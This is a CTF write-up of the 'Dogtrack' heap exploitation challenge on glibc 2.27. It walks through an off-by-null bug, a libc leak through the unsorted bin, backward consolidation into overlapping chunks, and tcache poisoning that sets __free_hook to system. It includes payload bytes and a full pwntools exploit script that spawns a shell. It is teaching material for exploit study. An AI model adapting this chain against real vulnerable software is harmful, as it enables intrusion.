# Dogtrack — CTF Binary Exploitation Writeup  
**Category:** Heap Exploitation  
**Tag:** "Not classy!"  
**Difficulty:** Hard  
**Protections:** Full RELRO, Stack Canary, NX, PIE  
**Libc:** Ubuntu GLIBC 2.27-3ubuntu1.6  

---

## Table of Contents

1. [Overview & Goal-Setting](#overview--goal-setting)
2. [Recon](#recon)
3. [Static Analysis — Understanding the Binary](#static-analysis)
4. [Vulnerability Discovery](#vulnerability-discovery)
5. [Phase 1 — Libc Leak](#phase-1--libc-leak)
6. [Phase 2 — Heap Grooming](#phase-2--heap-grooming)
7. [Phase 3 — Off-by-Null Backward Consolidation](#phase-3--off-by-null-backward-consolidation)
8. [Phase 4 — Tcache Poison → Shell](#phase-4--tcache-poison--shell)
9. [The Root Bug in Phase 4 (and how we found it)](#the-root-bug-in-phase-4)
10. [Full Exploit Script](#full-exploit-script)
11. [Key Takeaways](#key-takeaways)

---

## Overview & Goal-Setting

### First Question to Ask: What Do I Need to Win?

Before touching any tool, set the goal. Ask: *"What does a shell require?"*

```bash
# Check for quick wins first
objdump -t dogtrack_patched | grep -iE "win|flag|shell|system|execve"
strings dogtrack_patched | grep "/bin/sh"
```

Results:
- No `system@plt`
- No `execve` in PLT
- No `/bin/sh` string
- No win/flag function

No shortcuts. We need to build a full exploit chain.

The binary uses `free()` extensively, and glibc 2.27 has `__free_hook` available (hooks were not removed until glibc 2.34). The plan is:

```
Goal: shell
→ Need: system("/bin/sh") called
→ How:  free(ptr_to_/bin/sh) with __free_hook = system
→ Need: write system address to __free_hook
→ Need: __free_hook's address → need libc base
→ Need: a libc pointer leak from the heap
```

**Work backwards from the goal. Every step enables the next.**

---

## Recon

### Files and Setup

```bash
ls -la
file dogtrack_patched
strings libc.so.6 | grep "GNU C Library"
```

Output:
```
dogtrack_patched: ELF 64-bit LSB pie executable, x86-64, not stripped
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
```

The binary was patched with `pwninit` (sets the interpreter to the provided `ld-linux-x86-64.so.2`), which is needed to use the challenge's old libc on a modern system.

### Protections

```bash
checksec dogtrack_patched
```

```
Full RELRO    → GOT is read-only, no GOT overwrite
Stack Canary  → no simple stack smash
NX            → no shellcode on stack/heap
PIE           → addresses randomized, need a leak
```

### One-Gadgets (Backup Plan)

```bash
one_gadget libc.so.6
```

```
0x4f29e  execve("/bin/sh", rsp+0x40, environ)  [rcx==NULL]
0x4f302  execve("/bin/sh", rsp+0x40, environ)  [[rsp+0x40]==NULL]
0x10a2fc execve("/bin/sh", rsp+0x70, environ)  [[rsp+0x70]==NULL]
```

We ultimately used `__free_hook = system` instead, but these are good fallbacks.

### Key Libc Symbols

```bash
readelf -s libc.so.6 | grep -E "__free_hook|__malloc_hook|main_arena"
```

```
0x3ebc40  main_arena
0x3ebc30  __malloc_hook
0x3ed8e8  __free_hook
```

`main_arena + 96 = 0x3ebc40 + 0x60 = 0x3ebca0` — this is the unsorted bin head pointer, critical for the libc leak.

### Running the Binary

```
1) Go to pound    → manage dogs (breed/release)
2) Start race     → create win records
3) Hall of Fame   → read/wipe records
4) Quit
```

*Immediately try hidden inputs: does option 4 in Hall of Fame do anything?*

---

## Static Analysis

Open in Ghidra. Read every function. Draw structs on paper.

### Data Structures

**BSS layout:**
```
0x202100  numOfDogs    (int)
0x202104  numOfRecords (int)
0x202110  dogs[3]      → 3 pointers to dog chunks (only 3 kennels!)
0x202140  winRecords[16] → 16 pointers to record chunks
```

**Dog chunk — `malloc(0x28)` → chunk size `0x30`:**
```
chunk_ptr + 0x00  │ speed[8]    ← fgets(chunk,   8, stdin)
chunk_ptr + 0x08  │ name[32]    ← fgets(chunk+8, 0x20, stdin)
chunk_ptr + 0x28  │ EXPLICIT '\0' write  ← BUG (explained below)
```

**Record chunk — `malloc(0xf0)` → chunk size `0x100`:**
```
record + 0x00  │ name[0x20]    ← copied from dog->name (stops at '\0')
record + 0x20  │ timestamp     (8 bytes, time_t)
record + 0x28  │ win_count     (8 bytes, long)
record + 0x30  │ race_names[]  ← strcpy'd race names on each win
```

### The Race Ring Buffer (Important Detail)

```c
winRecords[numOfRecords % 16] = record;
numOfRecords++;
```

Records are stored in a **ring buffer** with `% 16`. If you race 16 times without wiping, slot 0 gets overwritten silently (old pointer lost without free). `numOfRecords` is never reset to zero. This matters for tracking which slots have live pointers.

### Hidden Menu Option 4 in hallOfFame

The menu only shows 1, 2, 3 — but the code handles option 4: **"FORGING RECORDS IS ILLEGAL"**.

```c
// Option 4: swap two records' names and timestamps
local_68 = winRecords[A];
local_60 = winRecords[B];

// Swap timestamps
swap(local_68[0x20], local_60[0x20]);

// Swap names via stack buffer
char local_48[32];                   // 32-byte stack buffer
strcpy(local_48,  local_68);         // copy A's name to stack
strcpy(local_68,  local_60);         // copy B's name into A
strcpy(local_60,  local_48);         // copy stack into B
```

This `strcpy` chain is the **delivery mechanism** for our tcache poison (Phase 4).

---

## Vulnerability Discovery

### Bug 1 — Off-by-Null in `pound()` (Primary Vulnerability)

Inside `pound()`, after breeding a dog:
```c
local_18 = (char *)malloc(0x28);
fgets(local_18 + 8, 0x20, stdin);   // name (max 31 bytes + null)
strcspn(local_18 + 8, "\n");         // strip newline
local_18[0x28] = '\0';               // ← BUG: one byte PAST the chunk
```

**Why is this past the chunk?**

In glibc on 64-bit, `malloc(0x28)` gives a chunk of size `0x30`. The memory layout:

```
chunk_base + 0x00  prev_size  (8 bytes)
chunk_base + 0x08  size=0x31  (8 bytes)
chunk_base + 0x10  user data  ← what malloc() returns (= local_18)
...
chunk_base + 0x30  ← NEXT CHUNK starts here
```

`local_18` = `chunk_base + 0x10`.
`local_18[0x28]` = `chunk_base + 0x38` = **next chunk's size field** (not prev_size — the size field is at +8 from next chunk's base).

**Confirming in pwndbg:**

```
pwndbg> break *pound+432
pwndbg> run
(interact to trigger breed)
pwndbg> x/8gx $rax-0x10
0x555555801250:  0x0000000000000000  0x0000000000000031   ← our chunk
0x555555801260:  0x...  0x...                              ← user data (rax)
...
0x555555801288:  0x0000000000020e01                        ← rax+0x28 = next chunk's SIZE
```

Writing `'\0'` to `rax+0x28` clears the LSB of the next chunk's size field = **clears the `PREV_INUSE` bit**.

**Bonus primitive from the name field:**

`fgets(local_18+8, 0x20, stdin)` writes up to 31 bytes starting at `local_18+8`. The last 8 bytes of the name (bytes 24–31 = `local_18[0x20..0x27]`) land exactly at:

```
local_18[0x20] = chunk_base + 0x30 = next chunk's prev_size field
```

So **name bytes 24–31 write into the next chunk's `prev_size`**. Combined with the null write that clears `PREV_INUSE`, we have full control over both fields needed for backward consolidation.

### Bug 2 — Ring Buffer Silent Overwrite

`winRecords[numOfRecords % 16]` overwrites without freeing. This causes intentional pointer aliasing in Phase 4 (overwriting slot 10 to place a pointer we control).

---

## Phase 1 — Libc Leak

### The Idea

When glibc frees a chunk into the **unsorted bin**, it writes `main_arena+96` into the chunk's `fd` and `bk` fields (the first 16 bytes of the user area). If we can **read** that pointer, we get `libc_base`.

**The key insight:** if a dog has an **empty name**, the race copy loop runs zero iterations and writes nothing to the record. The record's first 8 bytes stay as whatever was in that memory — including stale `fd` pointers from previously freed chunks.

### Tcache Fills First

glibc 2.27 tcache holds **maximum 7 chunks** per size class. Freeing 0x100 chunks:
- Frees 1–7: go to `tcache[0x100]` (no libc pointer, just a simple linked list)
- Free 8+: tcache full → goes to **unsorted bin** → `fd = main_arena+96` ✓

### Steps

```python
breed(0, b"", b"Fast")       # Dog0, empty name

for i in range(16): race(0)  # create 16 records (slots 0–15)
for i in range(16): wipe(i)  # free all:
                              #   slots 0-6 → tcache[0x100] (7/7 full)
                              #   slots 7-15 → unsorted bin / consolidation
for i in range(8):  race(0)  # allocate 8 NEW records:
                              #   7 from tcache (stale heap ptrs)
                              #   8th from unsorted bin → main_arena+96 at record[0]!

data = read_record(7)         # slot 7 = the unsorted bin chunk
libc_leak = u64(data[5:13])  # bytes after "Dog: "
libc.address = libc_leak - 0x3ebca0
```

**Checking the offset in pwndbg:**
```
pwndbg> p/x &main_arena
$1 = 0x7f...3ebc40
pwndbg> x/2gx <unsorted_bin_chunk>
<addr>: 0x00007f...3ebca0    ← fd = main_arena+96
```

`main_arena + 96 = main_arena + 0x60 = 0x3ebc40 + 0x60 = 0x3ebca0`.

---

## Phase 2 — Heap Grooming

### Goal

Set up a precise heap layout so the off-by-null affects exactly the chunk we want.

```
[ChunkA: 0x100]  ← will be freed to unsorted bin
[Dog1:   0x030]  ← our dog, holds the off-by-null write
[ChunkC: 0x100]  ← we free this to trigger consolidation
[Guard:  0x100]  ← prevents ChunkC merging with top chunk
```

### Why This Order?

malloc is sequential. Chunks are placed at increasing addresses. Race and breed in this order:

```python
race(0)              # slot 8  → ChunkA at heap[N]
breed(1, b"Victim")  # Dog1    → at heap[N+0x100]
race(0)              # slot 9  → ChunkC at heap[N+0x130]
race(0)              # slot 10 → Guard at heap[N+0x230]
```

Dog1 sits exactly between ChunkA and ChunkC on the heap. The off-by-null from Dog1 lands on ChunkC's size field.

**Checking in pwndbg after setup:**
```
pwndbg> heap
...
0x555...a00 sz=0x100 [PREV_INUSE]   ← ChunkA (winRecords[8])
0x555...b00 sz=0x030 [PREV_INUSE]   ← Dog1 (dogs[1])
0x555...b30 sz=0x100 [PREV_INUSE]   ← ChunkC (winRecords[9])
0x555...c30 sz=0x100 [PREV_INUSE]   ← Guard (winRecords[10])
```

---

## Phase 3 — Off-by-Null Backward Consolidation

### The Concept: Lying to glibc

When glibc frees ChunkC, it checks:
1. `ChunkC->size & PREV_INUSE` — is the previous chunk allocated?
2. If `PREV_INUSE == 0` → previous chunk is free → consolidate backward
3. Uses `ChunkC->prev_size` to find where the previous free chunk starts

By controlling both `prev_size` and `PREV_INUSE`, we lie to glibc:
- We say `PREV_INUSE = 0` (via off-by-null) → "previous chunk is free"
- We say `prev_size = 0x130` → "the free chunk starts 0x130 bytes before ChunkC"

`0x130 = ChunkA(0x100) + Dog1(0x30)`. Walking back 0x130 from ChunkC lands at ChunkA's base.

glibc then **unlinks ChunkA from unsorted bin** and merges: `ChunkA + Dog1 + ChunkC = 0x230 bytes`. Dog1's memory is now **inside the free chunk**, and `dogs[1]` becomes a dangling pointer.

### The Payload

```python
payload = b"B" * 24 + b"\x30\x01"
# local_18[0x08..0x1f] = "B"*24  (fills name slots before the critical bytes)
# local_18[0x20] = 0x30           ← ChunkC->prev_size byte 0
# local_18[0x21] = 0x01           ← ChunkC->prev_size byte 1
# local_18[0x22] = 0x00           ← strcspn kills the \n here
# local_18[0x23..0x27] = 0x00     ← from fresh heap (zero initialized)
# → ChunkC->prev_size = 0x0000000000000130 ✓
# local_18[0x28] = '\0'  (always)  ← clears ChunkC->PREV_INUSE ✓
```

### Steps

```python
# Fill tcache[0x100] → ChunkA bypasses tcache → lands in unsorted bin
for i in range(7): wipe(i)

wipe(8)              # ChunkA → unsorted bin
release(1)           # Dog1 → tcache[0x30]
breed(1, payload)    # re-breed Dog1 with fake prev_size + off-by-null
wipe(9)              # free ChunkC → triggers backward consolidation
                     # → 0x230 chunk in unsorted bin ✓
```

**Verifying in pwndbg after wipe(9):**
```
pwndbg> bins
unsortedbin
all [corrupted]
FD: 0x... → ... ← 0x... (0x230 chunk)
```

---

## Phase 4 — Tcache Poison → Shell

### The Root Bug We Had to Debug

The first version of Phase 4 failed silently. The shell was never spawned even though all earlier phases logged success.

**The bug:** Phase 3 filled `tcache[0x100]` with 7 entries (from `wipe(0..6)`) and **never drained them**. Phase 4's first races called `malloc(0xf0)` → chunk size 0x100 → tcache had 7 entries → malloc pulled from **tcache**, not from our 0x230 overlapping chunk. The Dog1 alias was never established. Every step after that was operating on the wrong memory.

**The fix:** drain `tcache[0x100]` with 7 dummy races before the key races.

**How to diagnose this in pwndbg:**
```
pwndbg> break *hallOfFame+689   # the free() call in wipe
pwndbg> continue
(after Phase 3 completes)
pwndbg> bins
tcachebins
0x100 [7/7]: 0x... → 0x... → ... (7 entries!)  ← tcache full
```

Seeing `[7/7]` after Phase 3 immediately reveals the problem.

### The Full Technique: Tcache Poisoning

glibc 2.27 tcache is a simple LIFO singly-linked list. **No double-free detection (added in 2.29). No alignment checks. No validation at all.**

When a chunk is freed to tcache:
```
freed_chunk[0..7]    ← stores pointer to next chunk in the list (the "fd")
tcache_entries[idx]  ← updated to point to this freed chunk
```

When malloc returns from tcache:
```
return tcache_entries[idx]   ← returns the user pointer DIRECTLY
advance entries[idx] to fd   ← (whatever is in freed_chunk[0..7])
```

**If we write a fake address into `freed_chunk[0..7]`, the next malloc returns that address.**

That's tcache poisoning: get write access to a freed chunk → overwrite first 8 bytes → next malloc from that size class returns your fake address.

### Setting Up the Alias (dogs[1] ↔ winRecords[10])

After draining tcache, two races from the 0x230 chunk:

```
malloc(0xf0) #1 → 0x100 chunk at ChunkA_base
               → user ptr = ChunkA_base + 0x10 = winRecords[9]

malloc(0xf0) #2 → 0x100 chunk at ChunkA_base + 0x100
               → user ptr = ChunkA_base + 0x100 + 0x10 = winRecords[10]
```

`ChunkA_base + 0x100 + 0x10` = where Dog1 originally was + 0x10 = **exactly dogs[1]**!

So `winRecords[10]` and `dogs[1]` point to the **same memory**.

**Verifying in pwndbg:**
```
pwndbg> x/gx &dogs+8           # dogs[1]
$1 = 0x55500001b110
pwndbg> x/gx winRecords+10*8   # winRecords[10]
$2 = 0x55500001b110            ← same address ✓
```

### The Full Phase 4 Steps

```python
# 1. Arm Dog0: name = p64(__free_hook - 8)
#    Every race with Dog0 writes this into record[0..7]
release(0)
breed(0, p64(libc.sym["__free_hook"] - 8))

# 2. Drain tcache[0x100] — 7 races (THE FIX)
for _ in range(7):
    race(0)
# tcache[0x100] now empty

# 3. Two KEY races from the 0x230 unsorted-bin chunk
race(0)   # slot 9:  ChunkA area, record[0..7] = p64(__free_hook-8)
race(0)   # slot 10: Dog1 area  = dogs[1] alias!

# 4. Free dogs[1] as a 0x100 chunk → tcache[0x100]
release(1)
# glibc writes fd=0 at dogs[1] (= winRecords[10]'s first 8 bytes)
# Our p64(__free_hook-8) is overwritten with 0. But winRecords[10] still points there!

# 5. Restore tcache fd via UAF write (FORGING option 4)
swap_records(10, 9)
# FORGING does: strcpy(winRecords[10], winRecords[9])
#             = strcpy(freed_Dog1_chunk, slot9_name)
#             = writes p64(__free_hook-8) back into freed chunk's fd ✓
# tcache[0x100] = { Dog1_chunk → fd = __free_hook-8 }

# 6. Pop Dog1_chunk from tcache (advance head to __free_hook-8)
race(0)
# malloc returns Dog1_chunk, writes p64(__free_hook-8) to it (harmless)
# tcache head now = __free_hook-8

# 7. Pop __free_hook-8 → write system there
breed(2, b"A" * 8 + p64(libc.sym["system"]))
race(2)
# malloc returns __free_hook-8 (no validation in 2.27!)
# Dog2's name (b"A"*8 + p64(system)) is copied to (__free_hook-8)[0..n]:
#   [0..7]  = "AAAAAAAA"       → bytes BEFORE __free_hook (harmless)
#   [8..14] = p64(system)[0..6] → __free_hook[0..6] = system addr
#   [15]    = 0x00 (null)       → stops copy; __free_hook[7] already 0 in bss ✓
# __free_hook = system() ✓

# 8. Trigger
breed(1, b"pwn", b"/bin/sh")
# dogs[1] is fresh chunk; speed="/bin/sh" at chunk+0x00

release(1)
# free(dogs[1]) → __free_hook(dogs[1]) → system(dogs[1]) → system("/bin/sh") → SHELL
```

**Why `__free_hook - 8` and not `__free_hook`?**

`__free_hook` is at some address like `0x7f...d8e8`. `p64(__free_hook)` has no null bytes in bytes 0–6 (the 7th byte = `0x7f`). But we need the name `b"A"*8 + p64(system)` to write `system` at `__free_hook`, so:
- Bytes 0–7 land at `(__free_hook - 8)[0..7]` = `[__free_hook-8 .. __free_hook-1]` (harmless)
- Bytes 8–14 land at `(__free_hook-8)[8..14]` = `__free_hook[0..6]`
- The 8th byte of `p64(system)` is `0x00` → copy stops. `__free_hook[7]` = 0x00 from bss init.

This alignment trick avoids needing to write a full 8-byte pointer through strcpy (which stops at null).

**Verifying __free_hook before trigger:**
```
pwndbg> x/gx &__free_hook
0x7f...d8e8: 0x00007f...f420   ← system() address ✓
```

---

## The Root Bug in Phase 4

To summarize the debugging journey:

1. Phase 3 ran correctly (confirmed by the "0x230 overlapping chunk" log).
2. Phase 4 failed silently — binary ran but no shell.
3. Hypothesis: tcache[0x100] was still full, causing races to pull wrong chunks.
4. Confirmed: `bins` in pwndbg showed `0x100 [7/7]` after Phase 3.
5. Fix: 7 drain races before the key races.

**pwndbg commands for diagnosis:**
```
pwndbg> bins               # show all bin contents (tcache, fastbins, unsorted)
pwndbg> tcache             # show per-size tcache counts
pwndbg> heap               # show all chunks with addresses and sizes
pwndbg> x/gx &winRecords   # show winRecords array
pwndbg> x/gx &dogs         # show dogs array
pwndbg> x/gx <addr>        # examine memory at address
pwndbg> telescope <addr>   # dereference pointers recursively
```

---

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

exe  = ELF("./dogtrack_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.log_level = 'info'

def conn():
    if args.REMOTE:
        return remote("addr", 1337)
    return process([exe.path])

io = conn()

# ─── Helpers ───────────────────────────────────────────────────────────────

def _main_menu():
    io.recvuntil(b"Quit\n> ")

def breed(kennel, name, speed=b"Fast"):
    io.sendline(b"1")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"1")
    io.recvuntil(b"Kennel Index > ")
    io.sendline(str(kennel).encode())
    io.recvuntil(b"(Max 32 characters) > ")
    io.sendline(name)
    io.recvuntil(b"(Max 8 characters) > ")
    io.sendline(speed)
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"3")
    _main_menu()

def trigger_free_no_sync(kennel):
    io.sendline(b"1")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"2")
    io.recvuntil(b"Kennel Index > ")
    io.sendline(str(kennel).encode())

def release(kennel):
    io.sendline(b"1")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"2")
    io.recvuntil(b"Kennel Index > ")
    io.sendline(str(kennel).encode())
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"3")
    _main_menu()

def race(kennel):
    io.sendline(b"2")
    io.recvuntil(b"Kennel Index > ")
    io.sendline(str(kennel).encode())
    _main_menu()

def wipe(idx):
    io.sendline(b"3")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"2")
    io.recvuntil(b"index > ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"3")
    _main_menu()

def read_record(idx):
    io.sendline(b"3")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"1")
    io.recvuntil(b"index > ")
    io.sendline(str(idx).encode())
    data = io.recvuntil(b"Leave\n> ")
    io.sendline(b"3")
    _main_menu()
    return data

def swap_records(i, j):
    io.sendline(b"3")
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"4")                   # hidden FORGING option
    io.recvuntil(b"index > ")
    io.sendline(str(i).encode())
    io.recvuntil(b"Index > ")
    io.sendline(str(j).encode())
    io.recvuntil(b"Leave\n> ")
    io.sendline(b"3")
    _main_menu()

def extract_ptr(data):
    if b"Dog: " not in data:
        return 0
    start = data.find(b"Dog: ") + 5
    days = [b"\nMon", b"\nTue", b"\nWed", b"\nThu", b"\nFri", b"\nSat", b"\nSun"]
    end = len(data)
    for d in days:
        pos = data.find(d, start)
        if pos != -1 and pos < end:
            end = pos
    if end <= start:
        return 0
    return u64(data[start:end].ljust(8, b'\x00'))

# ─── Sync ──────────────────────────────────────────────────────────────────
_main_menu()

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 1 — LIBC LEAK
# Dog0 has empty name → copy loop writes 0 bytes → stale heap/libc ptrs survive.
# Race ×16 → wipe all 16 → 7 go to tcache, rest to unsorted bin.
# Race ×8 → 7 from tcache, 8th from unsorted bin → main_arena+96 at record[0].
# ═══════════════════════════════════════════════════════════════════════════
log.info("=== PHASE 1: LIBC LEAK ===")

breed(0, b"", b"Fast")
for i in range(16): race(0)
for i in range(16): wipe(i)
for i in range(8):  race(0)

data = read_record(7)
libc_leak = extract_ptr(data)
assert libc_leak > 0x7f0000000000, f"bad leak: {hex(libc_leak)}"

libc.address = libc_leak - 0x3ebca0
log.success(f"libc base   : {hex(libc.address)}")
log.success(f"__free_hook : {hex(libc.sym['__free_hook'])}")
log.success(f"system()    : {hex(libc.sym['system'])}")

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 2 — HEAP GROOMING
# Build: [ChunkA 0x100][Dog1 0x30][ChunkC 0x100][Guard 0x100]
# ═══════════════════════════════════════════════════════════════════════════
log.info("=== PHASE 2: HEAP GROOMING ===")

race(0)              # slot 8  → ChunkA
breed(1, b"Victim")  # Dog1    (between A and C)
race(0)              # slot 9  → ChunkC
race(0)              # slot 10 → Guard

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 3 — OFF-BY-NULL → BACKWARD CONSOLIDATION
# name[24..25] = \x30\x01 → ChunkC->prev_size = 0x130
# chunk[0x28] = '\0'       → ChunkC->PREV_INUSE = 0
# free(ChunkC) → glibc walks back 0x130 → finds ChunkA in unsorted bin
# → merges ChunkA+Dog1+ChunkC = 0x230 overlapping chunk
# ═══════════════════════════════════════════════════════════════════════════
log.info("=== PHASE 3: OFF-BY-NULL + CONSOLIDATION ===")

for i in range(7): wipe(i)      # fill tcache[0x100] (7/7)
wipe(8)                          # ChunkA → unsorted bin
release(1)                       # Dog1 → tcache[0x30]
breed(1, b"B" * 24 + p64(0x130))# fake prev_size + off-by-null
wipe(9)                          # free ChunkC → backward consolidation → 0x230

log.success("0x230 overlapping chunk in unsorted bin!")

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 4 — TCACHE POISON → __free_hook = system → SHELL
#
# KEY FIX: Phase 3 left tcache[0x100] full (7 entries). Must drain first.
# After drain, next two malloc(0xf0) come from the 0x230 chunk:
#   slot 9  → ChunkA area
#   slot 10 → Dog1 area = dogs[1]  (alias established)
#
# Then double-free dogs[1] (as 0x100 chunk) → tcache[0x100].
# Use FORGING (swap_records) to write p64(__free_hook-8) into freed chunk fd.
# Next malloc → pops Dog1 chunk → tcache head = __free_hook-8.
# Next malloc → returns __free_hook-8 → write "A"*8+p64(system) → __free_hook=system.
# ═══════════════════════════════════════════════════════════════════════════
log.info("=== PHASE 4: TCACHE POISON → SHELL ===")

release(0)
breed(0, p64(libc.sym["__free_hook"] - 8))   # Dog0 name = __free_hook-8

for _ in range(7): race(0)   # drain tcache[0x100]

race(0)   # slot 9:  ChunkA area, name written = p64(__free_hook-8)
race(0)   # slot 10: Dog1 area  = dogs[1] alias!

release(1)            # free dogs[1] as 0x100 → tcache (glibc zeros fd)
swap_records(10, 9)   # strcpy(Dog1_chunk, slot9_name) → fd = __free_hook-8

race(0)               # pop Dog1_chunk; tcache head advances to __free_hook-8

breed(2, b"A" * 8 + p64(libc.sym["system"]))
race(2)               # pop __free_hook-8; write system at __free_hook ✓

log.success(f"__free_hook → system @ {hex(libc.sym['system'])}")

breed(1, b"pwn", b"/bin/sh")   # Dog1: speed = "/bin/sh"
trigger_free_no_sync(1)         # free(dogs[1]) → system("/bin/sh")
io.interactive()
```

---

## Key Takeaways

### 1. Heap Chunk Memory Layout (must know by heart)

```
chunk_base + 0x00  prev_size   (reused by previous chunk when both allocated)
chunk_base + 0x08  size | flags  (PREV_INUSE = bit 0)
chunk_base + 0x10  user data   ← what malloc() returns
...
chunk_base + N     next chunk starts here (N = chunk size)
```

For `malloc(0x28)`: chunk size = `0x30`. User data = `[0x10..0x37]`. Next chunk at `chunk_base + 0x30`.

The `prev_size` trick: adjacent allocated chunks share the `prev_size` field. The "extra" 8 bytes at the end of your user area overlap with the NEXT chunk's `prev_size`. This is why `malloc(0x28)` actually gives access to `0x28` bytes, not `0x20`.

### 2. Off-by-Null Primitive

A single null byte written past a chunk's user area (`chunk[size] = '\0'`) clears the `PREV_INUSE` bit of the next chunk. Combined with controlling `prev_size` (via the last bytes of the name field), this enables backward consolidation → overlapping chunks.

### 3. Tcache Is Dangerous in glibc 2.27

- No double-free detection
- No alignment/validity checks
- Stores and returns USER pointers directly
- Poisoning: write target address into `freed_chunk[0..7]` → next malloc returns it

### 4. Count Your Frees Per Size Class

`tcache[size]` fills after 7 frees. The **8th free** of that size goes to the unsorted bin. Always know your tcache state. Forgetting this was the single bug that prevented the shell.

### 5. The Thinking Process

```
1. What can I READ?    → leak opportunity
2. What can I WRITE?   → where, how many bytes, how many times?
3. What is ADJACENT?   → what gets corrupted by overflow?
4. Is there a UAF?     → dangling pointer = write-after-free
5. What's in tcache?   → count your frees, know what's there
6. Work backwards from the goal, every step enables the next
```

### 6. Useful pwndbg Commands for Heap Challenges

```bash
pwndbg> heap              # show all chunks (addr, size, flags)
pwndbg> bins              # show tcache, fastbins, unsorted, small, large bins
pwndbg> tcache            # show per-size tcache counts
pwndbg> x/gx <addr>      # read 8 bytes as hex at address
pwndbg> telescope <addr>  # dereference pointer chain
pwndbg> x/gx &__free_hook # check __free_hook value
pwndbg> p &main_arena     # find main_arena address
pwndbg> vmmap             # show memory mappings (find libc base)
```

### 7. Hidden Features Are Always Worth Checking

The FORGING option (menu option 4, hidden from the visible menu) was the **delivery mechanism** for the tcache poison. Always try out-of-range inputs, and always read every branch in the decompiler — not just the happy path.
